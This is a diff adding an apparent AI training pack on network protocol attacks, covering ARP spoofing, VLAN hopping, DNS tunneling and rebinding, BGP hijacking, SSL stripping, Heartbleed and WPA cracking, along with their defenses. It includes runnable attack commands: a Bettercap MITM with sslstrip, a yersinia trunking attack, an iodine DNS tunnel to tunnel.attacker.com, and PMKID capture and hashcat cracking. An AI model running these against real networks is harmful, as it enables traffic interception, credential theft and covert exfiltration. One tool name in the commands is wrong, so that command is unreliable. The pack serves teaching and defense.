@@ -1,0 +1,332 @@
+================================================================================
+TITAN AI — TRAINING PACK 046: NETWORK PROTOCOL ATTACKS
+ARP SPOOFING, VLAN HOPPING, BGP HIJACKING, DNS ATTACKS, SSL STRIPPING, MITM
+================================================================================
+
+================================================================================
+PART 1: LAYER 2 ATTACKS
+================================================================================
+
+--- ARP SPOOFING / POISONING ---
+
+ARP: Address Resolution Protocol. Maps IP → MAC.
+Operates at Layer 2 (Data Link). No authentication.
+
+ARP CACHE POISONING:
+  Normal: Host broadcasts "Who has 192.168.1.1? Tell 192.168.1.50."
+  Router replies: "192.168.1.1 is at aa:bb:cc:dd:ee:ff"
+  Host caches: 192.168.1.1 = aa:bb:cc:dd:ee:ff
+  
+  Attack: Attacker sends UNSOLICITED gratuitous ARP:
+  "192.168.1.1 is at 11:22:33:44:55:66" (attacker's MAC)
+  All hosts receiving this: Update cache → now send router traffic to attacker.
+  
+  Gratuitous ARP: ARP reply with no corresponding request. Hosts accept it. No authentication.
+
+MAN-IN-THE-MIDDLE (MITM):
+  Attacker poisons: Victim and Router ARP caches.
+  Victim's cache: Router IP → Attacker MAC.
+  Router's cache: Victim IP → Attacker MAC.
+  
+  All traffic: Victim → Attacker → Router → Internet → Router → Attacker → Victim.
+  Attacker: Reads/modifies all cleartext traffic. Injects packets.
+  
+  Tools: Arpspoof (dsniff), Ettercap, Bettercap.
+
+BETTERCAP ARP SPOOFING:
+  sudo bettercap -iface eth0
+  
+  # In bettercap interactive shell:
+  net.probe on               # Discover all hosts
+  net.show                   # Show discovered hosts
+  
+  set arp.spoof.targets 192.168.1.100   # Target specific host
+  set arp.spoof.duplex true             # Poison both target AND gateway (MITM)
+  arp.spoof on
+  
+  # Now MITM: All target traffic flows through attacker
+  set net.sniff.verbose false
+  net.sniff on               # Capture all traffic passing through
+  
+  # HTTP credential capture:
+  set http.proxy.sslstrip true          # SSL stripping
+  http.proxy on
+
+DETECTION:
+  Dynamic ARP Inspection (DAI): Switch feature. Validates ARP against DHCP binding table.
+  Enable on all untrusted ports: Drop ARP packets with incorrect IP-MAC mapping.
+  
+  Tools: arpwatch (logs ARP activity, alerts on changes), XArp.
+
+--- VLAN HOPPING ---
+
+VLANS: Logical segmentation. VLAN 10 (users) and VLAN 20 (servers) can't communicate normally.
+VLAN hopping: Attack allowing attacker to jump between VLANs.
+
+SWITCH SPOOFING:
+  Trunk ports: Carry traffic from multiple VLANs. Tagged with 802.1Q.
+  Access ports: Belong to single VLAN. No trunk protocol.
+  
+  Auto-trunking: Cisco DTP (Dynamic Trunking Protocol) — switches negotiate trunk.
+  Attack: Send DTP negotiate frames. Switch thinks attacker is another switch.
+  Attacker's port: Becomes a trunk. Receives traffic from ALL VLANs.
+  
+  # Tools: Yersinia, manual packet crafting.
+  yersinia -I -attack 3  # DTP trunking attack
+  
+  Fix: Disable DTP on all non-trunk ports.
+  switchport mode access             # Force access mode
+  switchport nonegotiate             # Disable DTP
+  switchport access vlan 100        # Assign to VLAN
+
+DOUBLE TAGGING (802.1Q double encapsulation):
+  Only works when: Attacker is on the NATIVE VLAN of a trunk.
+  Attack: Craft frame with TWO 802.1Q tags.
+  Outer tag: Native VLAN (stripped by first switch, no ID check for native).
+  Inner tag: Target VLAN.
+  
+  First switch: Strips outer tag (native VLAN handling). Forwards frame with inner tag.
+  Second switch: Sees inner tag. Forwards to target VLAN.
+  
+  ONE-WAY: Responses cannot be routed back to attacker (attack works for injection, not MITM).
+  Use: Send crafted packet to target in different VLAN (e.g., UDP/ICMP).
+  
+  Fix: Never use VLAN 1 as native. Set native VLAN to unused VLAN ID.
+
+================================================================================
+PART 2: DNS ATTACKS
+================================================================================
+
+--- DNS CACHE POISONING ---
+
+Kaminsky Attack (2008): Critical DNS vulnerability. All DNS implementations affected.
+
+MECHANISM:
+  DNS resolver asks authoritative server for record.
+  Attacker: Floods resolver with forged responses before real one arrives.
+  First to arrive with correct transaction ID: Accepted.
+  
+  Kaminsky: Flood with requests for random subdomains (random.example.com).
+  For each: Race to inject forged AUTHORITY RECORD pointing example.com to attacker's server.
+  If any forged response wins race: Resolver caches "example.com NS = attacker's server."
+  All future queries for example.com: Routed to attacker's DNS → Attacker controls all records.
+
+DNSSEC: Cryptographically signs DNS records. Validates responses.
+Defense against cache poisoning. But: Still not widely deployed (~30% of domains signed).
+
+DNS TUNNELING:
+  Use DNS queries/responses to exfiltrate data or build C2 channel.
+  Data encoded in: Subdomain labels, TXT record responses.
+  Bypasses: HTTP proxies, most egress firewalls (DNS usually allowed to internet).
+  
+  Example: iodine (DNS tunnel tool):
+  # Attacker server (resolves *.tunnel.attacker.com):
+  iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
+  
+  # Victim machine:
+  iodine -f -P password tunnel.attacker.com
+  # Creates tunnel interface: Full IP connectivity through DNS.
+  # Slow but reliable: ~1-5 KB/s through DNS.
+  
+  Tools: iodine, dnscat2, Cobalt Strike DNS beacon.
+
+DETECTION:
+  High query rate to single external domain.
+  Long subdomain labels (>30 chars) — data encoded.
+  High entropy subdomain names (base64/hex encoded data).
+  TXT record responses with large payloads.
+  
+  Cisco Umbrella / Infoblox: DNS security solutions that detect tunneling via ML.
+
+DNS REBINDING:
+  Bypass same-origin policy using DNS.
+  
+  Attack:
+  Attacker registers: attacker.com with TTL=1 (1 second TTL).
+  Victim browses to: attacker.com (executes attacker's JavaScript).
+  After 1 second: DNS record updated → attacker.com now resolves to 192.168.1.1 (victim's router).
+  Victim's browser: Makes requests to attacker.com (still same origin).
+  But: attacker.com now resolves to 192.168.1.1.
+  Browser sends requests to router's admin interface!
+  JavaScript reads: Router config, credentials, internal network details.
+  
+  Defense: DNS rebinding protection in browsers (reject non-public IP in DNS rebinding detection). Firewall rule: Block external DNS resolving to RFC 1918 addresses.
+
+--- DNS OVER HTTPS (DOH) SECURITY CONSIDERATIONS ---
+
+DoH: DNS queries sent as HTTPS to well-known resolver (Cloudflare 1.1.1.1, Google 8.8.8.8).
+Security benefit: Prevents ISP/network DNS surveillance and modification.
+Security risk: Bypasses corporate DNS filtering/monitoring. Malware uses DoH.
+  
+  Malware using DoH:
+  Instead of DNS to corporate DNS server (monitored): Send to 1.1.1.1 via HTTPS (port 443).
+  Corporate security: Cannot see DNS queries. Cannot block by DNS.
+  
+  Detection: Block DoH resolvers' IPs at egress. Force all DNS through corporate resolver.
+  Or: Monitor all DNS via HTTPS-intercepting proxy.
+
+================================================================================
+PART 3: BGP ATTACKS
+================================================================================
+
+--- BGP HIJACKING ---
+
+BGP: Border Gateway Protocol. Internet's routing protocol.
+Manages how traffic flows between Autonomous Systems (AS).
+AS: Large network (ISP, company, cloud provider). Each has AS number (ASN).
+
+BGP: No authentication by default. Any AS can announce any prefix.
+
+BGP HIJACKING:
+  Legitimate: AS65001 announces "192.168.1.0/24 is reachable via me."
+  Attack: AS65999 also announces "192.168.1.0/24 is reachable via me."
+  
+  Routers: Receive both announcements. Prefer: More specific route (longer prefix).
+  Attacker: Announce /25 (more specific than victim's /24) → gets more of the traffic.
+  
+REAL BGP HIJACKS:
+  Pakistan Telecom (2008): "Accidentally" hijacked YouTube global routes for 2 hours.
+  Mahindra Internet (2010): Hijacked Bangladesh internet traffic.
+  Russian state (2019): 8 minutes, BGP hijack redirected major financial institutions' traffic through Russia.
+  AWS (2018): Amazon Route 53 BGP hijack → Bitcoin cryptocurrency exchange traffic diverted.
+  
+  Amazon Route 53 attack:
+  AS10297 (eNet Ohio): Announced routes for 205.251.96.0/24 (Amazon).
+  Traffic to Amazon's DNS → Went to eNet → Fake DNS server → Redirected myetherwallet.com to phishing site.
+  Result: $150,000 in Ethereum stolen from users who got phishing page.
+
+BGP SECURITY SOLUTIONS:
+  RPKI (Resource Public Key Infrastructure): Cryptographically binds IP prefixes to ASNs.
+  Route Origin Authorization (ROA): "ASN 12345 is authorized to announce 1.2.3.0/24."
+  BGP Origin Validation: Routers check RPKI. Reject: Routes not matching ROA.
+  
+  Adoption: Partial. Major providers (Cloudflare, AWS, Comcast) validate RPKI.
+  But: Many smaller ISPs don't validate → still possible to reach non-validating networks.
+
+================================================================================
+PART 4: SSL/TLS ATTACKS
+================================================================================
+
+--- SSL STRIPPING ---
+
+MECHANISM:
+  MITM position: Attacker between client and server.
+  Client requests: https://bank.com
+  Attacker: Connects to bank.com via HTTPS. Establishes HTTPS session with server.
+  Attacker to client: Serves HTTP (unencrypted) version.
+  
+  Client: Sees HTTP. No lock icon. Sensitive data sent cleartext to attacker.
+  Attacker: Forwards (encrypted) to bank. Returns results unencrypted to client.
+  
+  Tool: sslstrip (Moxie Marlinspike).
+
+HSTS (HTTP Strict Transport Security): Defeats SSL stripping.
+  Server tells browser: "Only use HTTPS for this domain for next 365 days."
+  Stored in browser: Cannot be stripped by attacker.
+  Browser: Forces HTTPS even if page says HTTP.
+  
+  HSTS header:
+  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  
+  HSTS Preload: List of domains always loaded via HTTPS. Hardcoded in browsers.
+  Even first visit: Browser knows to use HTTPS. sslstrip cannot operate.
+
+--- BEAST, POODLE, HEARTBLEED ---
+
+BEAST (Browser Exploit Against SSL/TLS, CVE-2011-3389):
+  Target: TLS 1.0 CBC mode cipher suites.
+  Attack: MITM + JavaScript in browser + chosen-plaintext. Decrypt HTTPS cookies.
+  Fix: TLS 1.1/1.2 with improved CBC implementation. Modern browsers default TLS 1.2+.
+  Status: Largely obsolete (TLS 1.0 disabled in modern browsers).
+
+POODLE (Padding Oracle On Downgraded Legacy Encryption, CVE-2014-3566):
+  Target: SSLv3 (obsolete, 1996). Padding oracle in CBC mode.
+  Attack: Force downgrade to SSLv3, exploit padding oracle.
+  Fix: Disable SSLv3 entirely. TLS_FALLBACK_SCSV prevents forced downgrade.
+  Status: SSLv3 disabled everywhere. Obsolete.
+
+HEARTBLEED (CVE-2014-0160):
+  Target: OpenSSL 1.0.1 - 1.0.1f (2012-2014). TLS heartbeat extension.
+  Critical: Read 64KB of server memory per request. No authentication needed.
+  
+  What it leaks: Private keys, certificates, passwords, session tokens, anything in server memory.
+  Scale: 17% of SSL servers on internet affected (500,000+ vulnerable).
+  
+  Request: "Send me a heartbeat with 'test' (4 bytes), payload_length=65535."
+  Vulnerable server: Returns 65535 bytes starting from "test" in memory.
+  Returns: Memory contents beyond "test" — private keys, plaintext, session data.
+  
+  Fix: Update OpenSSL. Regenerate all TLS certificates (old ones may be compromised).
+  
+  Tool: heartbleed.py / ssl-heartbleed Nmap NSE script.
+
+--- TLS 1.3 IMPROVEMENTS ---
+
+TLS 1.3 (RFC 8446, 2018): Removed all vulnerable legacy features.
+
+Removed:
+  RSA key exchange (forward secrecy required now).
+  Static DH (forward secrecy required).
+  RC4, DES, 3DES, MD5, SHA-1 (all legacy ciphers).
+  Compression (CRIME attack vector).
+  Renegotiation (attack surface).
+  
+Added/improved:
+  0-RTT (Zero Round Trip Time) resumption: Send data on first packet. Performance.
+  But 0-RTT: Replay attack risk. Must not be used for non-idempotent requests.
+  Forward secrecy: Mandatory. Ephemeral key exchange only.
+  Encrypted: TLS handshake encrypted after ClientHello. SNI privacy (with ECH extension).
+
+================================================================================
+PART 5: WIRELESS SECURITY
+================================================================================
+
+--- WPA3 AND DRAGONBLOOD ---
+
+WPA3 (2018): Replaced WPA2. Main improvement: SAE (Simultaneous Authentication of Equals).
+SAE: Dragonfly key exchange. Prevents offline dictionary attacks.
+WPA2: PMKID offline attack → dictionary attack against captured handshake.
+WPA3: Even if 4-way handshake captured → Cannot brute-force offline. Must guess online (rate-limited).
+
+DRAGONBLOOD (CVE-2019-9494, CVE-2019-9496):
+  Side-channel attacks on WPA3 SAE implementation.
+  Cache-based: Timing/cache differences reveal bit of password. Repeat → full recovery.
+  Timing-based: Authentication timing reveals information about password.
+  
+  Affect: Many WPA3 implementations (firmware dependent).
+  Fixed: Vendor patches. Constant-time implementations.
+
+EVIL TWIN (ROGUE AP):
+  Attacker sets up: AP with same SSID as legitimate network.
+  Higher power: Clients connect to attacker's AP (stronger signal wins).
+  Clients: Attempt to authenticate. Capture handshake (WPA2) or credentials (open).
+  
+  Tool: hostapd-wpe (WPA Enterprise credential capture), airbase-ng.
+  
+  Advanced: RADIUS server spoofing for WPA-Enterprise.
+  WPA-Enterprise: EAP authentication to RADIUS server.
+  Evil twin with fake RADIUS: Capture MSCHAPV2 credentials → Crack offline → Username + password.
+
+PMKID ATTACK (WPA2, no client needed):
+  Traditional WPA2 crack: Requires capturing 4-way handshake. Client must connect.
+  PMKID attack (Jens Steube, 2018): Capture PMKID from single AP frame.
+  No client needed: AP broadcast contains PMKID.
+  PMKID = HMAC-SHA1(PMK, "PMK Name" || BSSID || client_MAC)
+  PMK derived from password. Can crack PMKID offline.
+  
+  hcxdumptool -i wlan0 -o capture.pcapng --enable_status=3
+  hcxtools pcapngtool capture.pcapng -o hashfile.22000
+  hashcat -m 22000 hashfile.22000 rockyou.txt
+
+================================================================================
+END OF PACK 046: NETWORK PROTOCOL ATTACKS
+Total: ARP spoofing/poisoning (mechanism, Bettercap MITM with SSL stripping, DAI
+defense), VLAN hopping (switch spoofing via DTP, double tagging with defense), DNS
+cache poisoning (Kaminsky attack, DNSSEC), DNS tunneling (iodine setup, detection
+signatures), DNS rebinding (SOP bypass, defense), DoH security implications, BGP
+hijacking (mechanism, real attacks including Amazon Route 53 Ethereum theft, RPKI
+defense), SSL stripping (sslstrip, HSTS/preload defense), BEAST/POODLE/Heartbleed
+(technical detail, fixes), TLS 1.3 improvements (removed features, 0-RTT replay risk),
+WPA3 Dragonblood side-channel attacks, evil twin/RADIUS spoofing, WPA2 PMKID attack
+with hashcat.
+================================================================================
